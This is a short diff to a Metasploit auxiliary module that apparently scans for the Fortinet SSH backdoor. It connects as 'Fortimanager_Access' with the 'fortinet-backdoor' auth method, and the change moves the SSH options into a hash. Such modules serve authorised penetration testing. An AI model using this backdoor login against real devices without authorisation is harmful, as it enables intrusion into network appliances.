@@ -36,20 +36,25 @@ class Metasploit4 < Msf::Auxiliary
     ])
 
     register_advanced_options([
-      OptBool.new('SSH_DEBUG', [false, 'SSH debugging', false]),
+      OptBool.new('SSH_DEBUG',  [false, 'SSH debugging', false]),
       OptInt.new('SSH_TIMEOUT', [false, 'SSH timeout', 10])
     ])
   end
 
   def run_host(ip)
+    ssh_opts = {
+      port:         datastore['RPORT'],
+      auth_methods: ['fortinet-backdoor']
+    }
+
+    ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
+
     begin
       ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
         Net::SSH.start(
           ip,
           'Fortimanager_Access',
-          port: datastore['RPORT'],
-          auth_methods: ['fortinet-backdoor'],
-          verbose: datastore['SSH_DEBUG'] ? :debug : nil
+          ssh_opts
         )
       end
     rescue Net::SSH::Exception => e
